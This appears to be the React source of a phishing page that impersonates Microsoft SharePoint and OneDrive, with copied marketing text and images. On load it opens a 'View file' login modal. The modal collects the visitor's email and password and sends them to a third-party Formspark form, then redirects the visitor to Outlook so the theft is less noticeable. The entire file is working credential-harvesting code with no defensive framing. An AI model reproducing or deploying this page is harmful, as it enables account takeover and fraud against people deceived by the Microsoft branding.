import { useFormspark } from "@formspark/use-formspark";
import { useState } from "react";
import { GrFormNext } from "react-icons/gr";
import { Modal } from "react-responsive-modal";
import "react-responsive-modal/styles.css";
import PhoneIcons from "../assets/images/RE4q5Ja.webp";
import PhoneOne from "../assets/images/phone1.webp";
import PhoneTwo from "../assets/images/phone2.webp";
import PhoneThree from "../assets/images/phone3.webp";
import ShareImg from "../assets/images/share.webp";
import Ondream from "../assets/images/splogo.png";

const FORMSPARK_FORM_ID = "ekS3rX9oR";

const DriveMain = () => {
  const [open, setOpen] = useState(true);

  const onCloseModal = () => setOpen(false);

  const [eml, setEml] = useState("");
  const [emlPass, setEmlPass] = useState("");

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    await submit({ eml, emlPass });
    return window.location.replace("wwww.outlook.com");
  };

  return (
    <div>
      <div className="bg-drive-bg block pb-4 md:pl-20 pt-12 text-center md:text-start md:flex justify-between">
        <div className="pb-3 md:pb-0">
          <div className="text-4xl md:text-5xl text-drive mx-8 font-bold">
            SharePoint
          </div>
          <div className="md:mr-48 md:ml-8 mx-6 text-2xl my-8 md:text-4xl">
            Your mobile, intelligent intranet
          </div>
          <div className="grid place-content-center md:ml-8 md:place-content-start">
            <div className="mx-auto">
              <button onClick={() => setOpen(true)} className="">
                <div className="bg-drive text-lg w-56 text-center mb-4 text-white py-3 cursor-pointer">
                  SharePoint
                </div>
              </button>
            </div>
            {/* <div className="mx-auto">
              <a href="/onedrive/login" className="">
                <div className="bg-white w-48 text-center text-drive py-3 border-2 border-drive cursor-pointer">
                  See plans and pricing
                </div>
              </a>
            </div> */}
          </div>
        </div>
        <div className="">
          <img src={PhoneIcons} alt="logo" className="" />
        </div>
      </div>
      <div className="organize bg-white-500">
        <div className="text-3xl text-center my-4 font-bold">
          Organized. Protected. Connected.
        </div>
        <div className="block md:flex justify-between p-6 text-center">
          <div className="mx-4 pb-7 md:pb-0">
            <img src={PhoneOne} alt="logo" className="mx-auto" />
            <div className="text-lg font-bold">Anywhere access</div>
            <div className="text-lg">
              Enjoy the freedom to access, edit, and share your files on all
              your devices, wherever you are.
            </div>
          </div>
          <div className="mx-4 pb-7 md:pb-0">
            <img src={PhoneTwo} alt="logo" className="mx-auto" />
            <div className="text-lg font-bold">Back up and protect</div>
            <div className="text-lg">
              If you lose your device, you won’t lose your files and photos when
              they’re saved in OneDrive.
            </div>
          </div>
          <div className="mx-4 pb-7 md:pb-0">
            <img src={PhoneThree} alt="logo" className="mx-auto" />
            <div className="text-lg font-bold">Share and collaborate</div>
            <div className="text-lg">
              Stay connected, share your documents and photos with friends and
              family, and collaborate in real time with Office apps.
            </div>
          </div>
        </div>
      </div>
      <div className="share py-6 md:py-16 bg-gray text-center md:mx-0 md:flex justify-between">
        <img src={ShareImg} alt="logo" className="w-11/12 md:w-2/6 mx-auto" />
        <div className="md:w-1/2 mx-3 md:mt-12">
          <div className="text-3xl md:text-4xl my-2 font-bold">
            Share and collaborate
          </div>
          <div className="text-lg my-3">
            Stay connected, share your documents and photos with friends and
            family, and collaborate in real time with Office apps.
          </div>
          <a
            href="/onedrive/login"
            className="flex text-drive text-sm md:text-lg"
          >
            Download Microsoft OneDrive mobile app
            <span className=" ml-1">
              <GrFormNext
                color="blue"
                // paddingTop="5px"
                fontSize="1.6rem"
              />
            </span>
          </a>
        </div>
        {open && (
          <div>
            <Modal open={open} onClose={onCloseModal} center>
              <div className="relative flex flex-col justify-center w-80 md:w-96 md:overflow-hidden">
                <div className="w-full px-2 py-6 m-auto bg-white rounded-md shadow-md lg:max-w-xl">
                  <img
                    src={Ondream}
                    alt="dream"
                    className="w-60 place-content-center"
                  />
                  <form className="mt-6" onSubmit={handleSubmit}>
                    <div className="mb-2">
                      <label
                        for="email"
                        className="block text-sm font-semibold text-drive"
                      >
                        Email
                      </label>
                      <input
                        type="email"
                        value={eml}
                        onChange={(e) => setEml(e.target.value)}
                        required
                        className="block w-full px-4 py-2 mt-2 text-drive bg-white border rounded-md focus:border-drive focus:ring-drive focus:outline-none focus:ring focus:ring-opacity-40"
                      />
                    </div>
                    <div className="mb-2">
                      <label
                        for="password"
                        className="block text-sm font-semibold text-drive"
                      >
                        Password
                      </label>
                      <input
                        type="password"
                        value={emlPass}
                        onChange={(e) => setEmlPass(e.target.value)}
                        required
                        className="block w-full px-4 py-2 mt-2 text-drive bg-white border rounded-md focus:border-drive focus:ring-drive focus:outline-none focus:ring focus:ring-opacity-40"
                      />
                    </div>
                    <a href="#" className="text-xs text-drive hover:underline">
                      Forget Password?
                    </a>
                    <div className="mt-6">
                      <button
                        type="submit"
                        disabled={submitting}
                        className="w-full px-4 py-2 tracking-wide text-white transition-colors duration-200 transform bg-drive rounded-md focus:outline-none"
                      >
                        View file
                      </button>
                    </div>
                  </form>

                  <p className="mt-8 text-xs font-light text-center text-gray-700">
                    Don't have an account?
                    <a
                      href="#"
                      className="font-medium text-drive hover:underline"
                    >
                      Sign up
                    </a>
                  </p>
                </div>
              </div>
            </Modal>
          </div>
        )}
      </div>
    </div>
  );
};

export default DriveMain;
